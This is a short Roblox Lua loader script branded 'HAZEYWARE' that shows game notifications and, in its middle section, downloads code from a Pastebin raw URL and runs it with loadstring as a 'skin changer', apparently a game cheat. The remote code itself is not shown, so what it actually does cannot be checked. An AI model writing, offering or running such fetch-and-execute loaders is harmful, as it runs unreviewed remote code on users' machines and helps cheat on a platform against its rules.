local StarterGui = game:GetService("StarterGui")

-- Notification
pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "HAZEYWARE",
        Text = "Loading Skin Changer...",
        Duration = 3
    })
end)

-- Auto-load skin changer
local SCRIPT_URL = "https://pastebin.com/raw/4rVNKnw0"

pcall(function()
    loadstring(game:HttpGet(SCRIPT_URL))()
end)

-- Loaded notification
task.wait(1)

pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "HAZEYWARE",
        Text = "Skin Changer Loaded ✓",
        Duration = 5
    })
end)
